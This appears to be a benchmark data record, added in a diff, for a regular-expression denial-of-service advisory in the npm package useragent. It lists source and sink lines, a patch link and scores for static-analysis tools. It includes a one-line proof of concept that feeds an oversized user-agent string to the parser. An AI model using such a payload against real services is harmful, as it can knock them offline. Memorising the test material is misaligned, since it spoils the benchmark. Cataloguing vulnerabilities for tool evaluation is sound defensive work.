@@ -1,0 +1,66 @@
+{
+    "advisory": {
+        "id": "GHSA-pjmx-9xr3-82qr",
+        "cwe": "CWE-400"
+    },
+    "correct_cwe": "CWE-400",
+    "correct_package_link": "https://registry.npmjs.org/useragent/-/useragent-2.1.12.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "index.js",
+                    "lineno": 445,
+                    "code": "exports.parse = function parse(userAgent, jsAgent) {"
+                },
+                "sink": {
+                    "file": "index.js",
+                    "lineno": 455,
+                    "code": "if (res = parsers[i][0].exec(userAgent)) {"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "``` var useragent = require('useragent');var badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP'; var request = 'GET / HTTP/1.1\r\nUser-Agent: ' + badUserAgent + '\r\n\r\n'; console.log(useragent.parse(request)); ```"
+        }
+    ],
+    "patch": [
+        {
+            "url": "https://github.com/3rd-Eden/useragent/commit/b18cf7c2a13c994ea8d6d0d132feef4eb8193c36"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "A"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "C"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "A"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "C"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "C"
+        },
+        "odgen": {
+            "score": "C"
+        }
+    }
+}
